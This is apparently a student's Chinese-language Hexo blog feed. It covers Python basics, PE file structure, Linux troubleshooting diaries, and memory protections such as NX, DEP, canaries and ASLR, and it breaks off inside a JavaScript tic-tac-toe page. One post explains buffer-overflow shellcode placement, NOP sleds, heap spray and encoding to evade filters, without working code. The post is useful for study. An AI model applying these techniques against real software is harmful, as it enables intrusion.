(‘element31’,’element32’),’element4’)</li></ol><ul><li><p>一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const；</p></li><li><p>获取元素方法与list相同；</p></li><li><p>当只有一个元素时  t=(1,) 需要使用’，’来消除歧义；</p></li><li><p>tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。</p></li></ul><h1 id="python-dic"><a href="#python-dic" class="headerlink" title="python dic"></a>python dic</h1><p>  （同c++map）</p><p>d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3}    =&gt;  d[‘key1’] -&gt;value1</p><p>为避免key不存在：</p><ul><li>‘key’ in d 不存在则返回False；       </li><li>d.get(‘key’,value) 不存在则返回value；</li><li>pop(key)可以删除key即对应的value。</li></ul><h1 id="python-set"><a href="#python-set" class="headerlink" title="python set"></a>python set</h1><ul><li><p>set也是一组key的集合但不储存value；key不能重复。</p></li><li><p>创建set需要提供一个list作为输入集合 s = set([1,2,3]);</p></li><li><p>add(key)添加key ；remove(key)删除key。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">和list比较，dict有以下几个特点：</span><br><span class="line"></span><br><span class="line">    查找和插入的速度极快，不会随着key的增加而变慢；</span><br><span class="line">    需要占用大量的内存，内存浪费多。</span><br><span class="line"></span><br><span class="line">而list相反：</span><br><span class="line"></span><br><span class="line">    查找和插入的时间随着元素的增加而增加；</span><br><span class="line">    占用空间小，浪费内存很少。</span><br><span class="line"></span><br><span class="line">所以，dict是用空间来换取时间的一种方法。</span><br></pre></td></tr></table></figure><h1 id="python-loop"><a href="#python-loop" class="headerlink" title="python loop"></a>python loop</h1><ol><li><p>for i in list/tuple:  把list或tuple中的每个元素带入i，执行之后缩进块的语句；</p><p>range()函数可以生成一个整数序列，list(range(n))可以将其转化为list；</p></li><li><p>while xxx：</p></li><li><p>break / continue 同c。</p></li></ol><h1 id="python-func"><a href="#python-func" class="headerlink" title="python func"></a>python func</h1><ul><li><p>空函数：pass用来做占位符，让代码格式正确。</p></li><li><p>可以返回多个值，实质上是返回的tuple；</p></li><li><p>None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Python2.7在一行输入多个数字的方法：</span><br><span class="line"></span><br><span class="line">         输入一个数字 m = int(raw_input())</span><br><span class="line"></span><br><span class="line">输入多个数字是 m, n,.... = map(int, raw_input().split())</span><br></pre></td></tr></table></figure><ul><li><p>可变参数：   函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L,  调用funcname(L)即可；</p></li><li><p>关键字参数：函数def funcname(a,b,’<em>‘’</em>‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F);</p></li><li><p>命名关键字参数：函数def funcname(a,b,’<em>‘,c,d):’</em>‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’<em>‘,c,d，e):可变参数</em>c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D);</p></li></ul><h1 id="python-slice"><a href="#python-slice" class="headerlink" title="python slice"></a>python slice</h1><p>用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’]</p><p>slice操作符使用：</p><p>  eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]；</p><p>  L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个；</p><h1 id="python-iteration"><a href="#python-iteration" class="headerlink" title="python iteration"></a>python iteration</h1><p>即循环遍历；</p><p>d = {‘a’: 1, ‘b’: 2, ‘c’: 3}</p><p>eg:</p><ul><li>循环迭代dict： for key in d://默认dict 迭代的是key ；<br>迭代value : for value in d.values()；<br>同时迭代 ：for k,v ind.items()</li></ul><ul><li>判断是否可迭代：通过collections模块的Iterable类型判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> from collections import Iterable </span><br><span class="line">isinstance(objects,Iterable)</span><br></pre></td></tr></table></figure><ul><li>下标循环的实现：通过内置的enumerate函数判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]):</span><br></pre></td></tr></table></figure><h1 id="python-list-generation"><a href="#python-list-generation" class="headerlink" title="python list generation"></a>python list generation</h1><p>eg：</p><ul><li><p>生成L=[1,4,9,….100]：<code>[x*x for x in range(1,100)]</code>;</p></li><li><p>筛选出仅偶数的平方：<code>[x*x for x in range(1,100) if x%2 ==0]</code>;</p></li><li><p>两层循环生成全排列：<code>[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]</code>;</p></li><li><p>列出当前目录下所有文件即目录名：<code>import os  | [d for d in os.listdir(&#39;.&#39;)]</code>;</p></li><li><p>把一个list L 中所有字符串变为小写：<code>[s.lower() for s in L]</code>;</p></li></ul><h1 id="python-genarator"><a href="#python-genarator" class="headerlink" title="python genarator"></a>python genarator</h1><p>不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator；</p><p>方法：将列表生成式的[]改为()即可；</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>The art 0f deploying shellcode</title>
      <link href="/2018/07/26/the-art-0f-deploying-shellcode/"/>
      <url>/2018/07/26/the-art-0f-deploying-shellcode/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="shellcode布置"><a href="#shellcode布置" class="headerlink" title="shellcode布置"></a>shellcode布置</h1><ol><li><p>将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片1-2.png" alt="1" title="" class="">                <p>1</p>            </figure></li><li><p>使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片2-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片3-1.png" alt="3" title="" class="">                <p>3</p>            </figure></li><li><p>为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片4-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片5-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片7-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-2.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><h1 id="shellcode的编码技术"><a href="#shellcode的编码技术" class="headerlink" title="shellcode的编码技术"></a>shellcode的编码技术</h1><ul><li>原因：</li></ul><ol><li><p>所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。</p></li><li><p>有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。</p></li><li><p>基于特征的IDS系统往往会对常见的shellcode进行拦截。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片9-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片10-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><ul><li><p>解决：</p><p>编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。</p></li></ul>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>What&#39;s PE files?</title>
      <link href="/2018/07/23/what-s-pe-files/"/>
      <url>/2018/07/23/what-s-pe-files/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="PE-文件概论"><a href="#PE-文件概论" class="headerlink" title="PE 文件概论"></a>PE 文件概论</h1><p>PE（portable Executable）windows系统下的可执行文件格式</p><p>1 . 32位可执行文件-PE32 ；</p><pre><code>64位可执行文件-PE+/PE32+ ，是PE文件的扩展形式。</code></pre><ol start="2"><li><p>分类：可执行系列 exe scr ；库系列 dll ocx cpl drv ；驱动程序系列 sys vxd ；对象文件系列 obj （唯一不可执行）。</p></li><li><p>基本结构</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/1.png" alt="1" title="" class="">                <p>1</p>            </figure></li></ol><p>DOS头到节区头是PE的头部分；</p><p>文件中使用偏移offset，内存中使用VA（virtual address 虚拟地址）表示位置；</p><ol start="4"><li>VA指进程虚拟内存的绝对地址，RVA指从某个基准位置开始的相对地址。</li></ol><p>RVA+ImageBase=VA</p><h1 id="PE头-1"><a href="#PE头-1" class="headerlink" title="PE头(1)"></a>PE头(1)</h1><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/2.png" alt="2" title="" class="">                <p>2</p>            </figure><p>1.DOS头：IMAGE_DOS_HEADER结构体<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/3.png" alt="3" title="" class="">                <p>3</p>            </figure></p><p>40个字节/ e_magic:DOS签名（4D5A 签名值MZ）/e_lfanew:指示NT头的偏移（小端序标识法）</p><p>2.DOS存根（stub）/可选项，大小不固定/DOS环境才会执行</p><p>3.NT头： IMAGE_NT_HEADERS结构体</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/4.png" alt="4" title="" class="">                <p>4</p>            </figure><p>F8个字节/三个成员：签名（50450000）+文件头+可选头。</p><p>①文件头：IMAGE_FILE_HEADER结构体<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/5.png" alt="5" title="" class="">                <p>5</p>            </figure><br>该结构体重要成员（设置不正确，程序无法运行）</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/6.png" alt="6" title="" class="">                <p>6</p>            </figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/7.png" alt="7" title="" class="">                <p>7</p>            </figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/8.png" alt="8" title="" class="">                <p>8</p>            </figure><p>②可选头： IMAGE_OPTIONAL_HEADER32<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/9.png" alt="9" title="" class="">                <p>9</p>            </figure><br>（PE头结构体中最大的）</p><p>重要成员<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/10.png" alt="10" title="" class="">                <p>10</p>            </figure><br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/11.png" alt="11" title="" class="">                <p>11</p>            </figure><br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/12.png" alt="12" title="" class="">                <p>12</p>            </figure></p><p>③节区头： IMAGE_SECTION_HEADER<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/13.png" alt="13" title="" class="">                <p>13</p>            </figure><br>不同内存属性访问权限：code  rwx /data rw /resource r<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/14.png" alt="14" title="" class="">                <p>14</p>            </figure><br>重要成员</p><h1 id="PE头-2"><a href="#PE头-2" class="headerlink" title="PE头(2)"></a>PE头(2)</h1><ol><li>内存地址与文件偏移间的映射：RVA to RAW（即file offset）</li></ol><p>公式：RAW - PointerToRawData = RVA -VirtualAddress</p><p>RAW = RVA -VirtualAddress + PointerToRawData<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/15.png" alt="15" title="" class="">                <p>15</p>            </figure><br>eg：</p><p>RVA = 5000 位于第一节区（.text），VA = 1000（该节区内存的的起始地址），</p><p>PointerToRawData= 400 （该节区文件的起始地址） 。</p><p>RAW = 5000 -1000 +400 =4400.</p><p>2.DLL（动态链接库）</p><p>不把库包含在程序中，而是单独组成DLL文件，需要时调用即可/更新库时只需要替换DLL文件即可/内存映射使加载后的DLL代码，资源在多个进程中实现共享。</p><p>Windows版本不同，环境不同，被调用函数的位置（地址）也不相同。</p><p>①为了确保在所有环境中都能正常调用被调用函数，编译器保存了被调用函数实际地址的位置。PE装载器将被调用函数的地址写到该位置。</p><p>②DLL重定位。DLL的ImageBase默认为1000000，若某个程序使用a.dll与b.dll时，a已被装载到内存的10000000处，PE装载器只能查找其他空白的内存空间，将b装载进去。</p><p>③PE头表示地址用RVA 而不是VA。</p><p>3.IAT（Import Address Table 导入地址表）：用来记录程序正在使用库中的哪些函数。</p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20180720</title>
      <link href="/2018/07/20/diary-20180720/"/>
      <url>/2018/07/20/diary-20180720/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>或许是因为复习时不怎么使用虚拟机，导致网络的某些配置出现了问题，按照网上的各种方法怎么也搞不好，历经小半天，终于解决。方法如下：</p><p>1.到根目录下/etc/network找到interfaces文件</p><p>2.</p><p>vi打开：<code>vi interfaces</code></p><p>此时发现，只有两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br></pre></td></tr></table></figure><p>之所以不能联网是因为这个文件不完整。</p><p>讲这两行替换为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line">auto eth2</span><br><span class="line">iface eth2 inet dhcp</span><br><span class="line">auto ath0</span><br><span class="line">iface ath0 inet dhcp</span><br><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br></pre></td></tr></table></figure><p>3.退出vi，启动项 <code>/etc/init.d/networking</code>，重启网络连接<code>sudo /etc/init.d/networking restart</code>，就ok了</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20180517</title>
      <link href="/2018/05/17/diary-20180517/"/>
      <url>/2018/05/17/diary-20180517/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环；</p><p>寻求各色解法，e.g. vi /etc/profile  但是其文件正常，之后终于在误打误撞中解决。</p><p>步骤：<br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="1" title="(1).png" class="">                <p>(1).png</p>            </figure><br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="2" title="(2).png" class="">                <p>(2).png</p>            </figure></p><p>进入 recovery mode（也就是纯命令行模式）</p><p>输入用户密码</p><p>按理说 应该继续 apt-get update -f</p><p>但会提示 输入 dpkg –configure -a</p><p>完成后重新update 就ok啦</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn0.0 --Protection technology</title>
      <link href="/2018/05/13/protection-technology/"/>
      <url>/2018/05/13/protection-technology/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="NX保护和DEP保护"><a href="#NX保护和DEP保护" class="headerlink" title="NX保护和DEP保护"></a>NX保护和DEP保护</h1><p>两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限</p><h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><p>NX保护，全称为 “No eXecute” ，意为 [禁止执行]<br>我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。</p><p>linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。</p><h2 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h2><p>DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护</p><p>数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码</p><p>主要优点<br>我觉得这种保护技术组要应用于Windows</p><p>这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。<br>百度百科上有这样一句话：</p><p>可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。</p><p>*P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。</p><h1 id="Linux-Canary保护"><a href="#Linux-Canary保护" class="headerlink" title="Linux Canary保护"></a>Linux Canary保护</h1><p>Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：<br>溢出栈缓冲区<br>劫持方式</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/1.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。<br>然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下：</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/2.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。</p><p>注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。</p><h1 id="ASLR地址空间布局随机化"><a href="#ASLR地址空间布局随机化" class="headerlink" title="ASLR地址空间布局随机化"></a>ASLR地址空间布局随机化</h1><p>ASLR ，全称为 Address space layout randomization<br>顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p><p>但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。</p><p>关于这个，多的我也说不上来，给几个文章的地址吧。</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE ，全称为 position-independent executables<br>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。</p><p>内存地址随机化机制，有以下三种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数 意义</span><br><span class="line">0 表示关闭进程地址空间随机化</span><br><span class="line">1 表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line">2 表示在1的基础上增加栈（heap）的随机化</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br><em>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</em></p><h1 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h1><p>这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。</p><p>系统防护（全）：<br><a href="http://www.mamicode.com/info-detail-1990426.html" title="1" target="_blank" rel="noopener">二进制的保护机制</a><br><a href="https://blog.csdn.net/x_nirvana/article/details/61420056" title="2" target="_blank" rel="noopener">WINDOWS和LINUX的内存防护机制</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JavaScript Naughts and Crosses</title>
      <link href="/2018/01/24/javascript-naughts-and-crosses/"/>
      <url>/2018/01/24/javascript-naughts-and-crosses/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><p>学习html,js,css一周做了个粗糙的人机井字棋，虽然很丑，但是有彩蛋啊，比如说：黑白图片来自我c语言课设那刷屏的烫烫烫hhh。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;澳门皇家赌场&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">h1&#123;color:blue;&#125;</span><br><span class="line">table&#123;background-color:rgb(182,194,154);</span><br><span class="line">width:450px;</span><br><span class="line">height:450px;&#125;</span><br><span class="line">body&#123;background-color:rgb(131,175,155);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;</span><br><span class="line">alert(&quot;欢迎来到棋牌室！&quot;);</span><br><span class="line">var a=new Array(10)</span><br><span class="line">for(var i=0;i&lt;9;i++)</span><br><span class="line">a[i]=0;</span><br><span class="line"></span><br><span class="line">function start()</span><br><span class="line">&#123;</span><br><span class="line">for(var i=0;i&lt;9;i++)</span><br><span class="line">&#123; a[i]=0;</span><br><span class="line">document.getElementById(&quot;srci&quot;+String(i)).src=&quot;back.png&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">coun=0;</span><br><span class="line"></span><br><span class="line">function restart()</span><br><span class="line">&#123;</span><br><span class="line">window.location.reload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function img_change(id)</span><br><span class="line">&#123;</span><br><span class="line">var x=1;</span><br><span class="line">while(x==1)&#123;</span><br><span class="line">if(id==&quot;div0&quot;&amp;&amp;a[0]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[0]=1;</span><br><span class="line">document.getElementById(&quot;srci0&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div1&quot;&amp;&amp;a[1]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[1]=1;</span><br><span class="line">document.getElementById(&quot;srci1&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div2&quot;&amp;&amp;a[2]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[2]=1;</span><br><span class="line">document.getElementById(&quot;srci2&quot;).src=&quot;timg.png&quot;;</span><br><span 